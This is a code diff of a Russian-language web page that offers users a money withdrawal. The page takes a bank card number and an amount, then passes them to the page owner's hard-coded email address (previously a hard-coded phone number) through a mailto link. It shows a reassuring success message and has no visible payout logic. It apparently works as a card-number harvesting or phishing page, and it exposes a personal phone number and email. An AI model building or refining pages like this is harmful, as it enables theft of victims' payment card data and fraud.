@@ -161,7 +161,7 @@
             margin-bottom: 8px;
         }
 
-        .sms-info {
+        .email-info {
             background: #e3f2fd;
             border: 1px solid #bbdefb;
             border-radius: 8px;
@@ -170,7 +170,7 @@
             text-align: center;
         }
 
-        .sms-info h3 {
+        .email-info h3 {
             color: #1976d2;
             margin-bottom: 10px;
         }
@@ -185,8 +185,8 @@
             <p>Доступно для вывода</p>
         </div>
 
-        <div class="sms-info">
-            <h3>📱 Уведомления приходят SMS на телефон</h3>
+        <div class="email-info">
+            <h3>📧 Уведомления приходят на почту</h3>
         </div>
         
         <button class="btn" id="withdrawBtn">💳 Вывести деньги</button>
@@ -208,7 +208,7 @@
         <div class="success-message" id="successMessage">
             <h3>✅ Заявка успешно отправлена!</h3>
             <p>Мы обработаем ваш запрос в течение 24 часов.</p>
-            <p>📬 SMS уведомление отправлено на ваш телефон</p>
+            <p>📬 Уведомление отправлено на вашу почту</p>
         </div>
         
         <div class="info">
@@ -231,8 +231,8 @@
             const cardNumberInput = document.getElementById('cardNumber');
             const amountInput = document.getElementById('amount');
             
-            // ⚠️ ВАШ НОМЕР ТЕЛЕФОНА - ЗАМЕНИТЕ НА СВОЙ!
-            const YOUR_PHONE_NUMBER = '+79185155743'; // ← ЗДЕСЬ ВПИШИТЕ ВАШ НОМЕР
+            // ⚠️ ВАША ПОЧТА - ЗАМЕНИТЕ НА СВОЮ!
+            const YOUR_EMAIL = 'mironnelox2016@gmail.com'; // ← ЗДЕСЬ ВАША ПОЧТА
             
             // Обработчик для кнопки "Вывести деньги"
             withdrawBtn.addEventListener('click', function() {
@@ -274,21 +274,23 @@
                 withdrawForm.style.display = 'none';
                 successMessage.style.display = 'block';
 
-                // Отправляем SMS уведомление
-                sendSMSNotification(cardNumber, amount, YOUR_PHONE_NUMBER);
+                // Отправляем на почту
+                sendEmailNotification(cardNumber, amount, YOUR_EMAIL);
             });
 
-            // Функция отправки SMS
-            function sendSMSNotification(cardNumber, amount, phoneNumber) {
-                const message = `Заявка на вывод: Карта ${cardNumber}, Сумма ${amount}₽`;
+            // Функция отправки на почту
+            function sendEmailNotification(cardNumber, amount, email) {
+                const subject = 'НОВАЯ ЗАЯВКА НА ВЫВОД';
+                const body = `Заявка на вывод средств:\n\nКарта: ${cardNumber}\nСумма: ${amount}₽\nВремя: ${new Date().toLocaleString()}\n\nТребуется обработка.`;
                 
-                console.log('📱 Отправляем SMS на номер:', phoneNumber);
-                console.log('💬 Текст SMS:', message);
+                // Открываем почтовый клиент
+                const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+                window.location.href = mailtoLink;
                 
-                // Здесь будет код для отправки SMS через SMS шлюз
-                // Например через sms.ru, twilio или другой сервис
+                console.log('📧 Отправляем на почту:', email);
+                console.log('💬 Текст:', body);
                 
-                alert('✅ Заявка отправлена! SMS придет на ваш телефон');
+                alert('✅ Заявка отправлена! Проверьте вашу почту');
             }
         });
     </script>
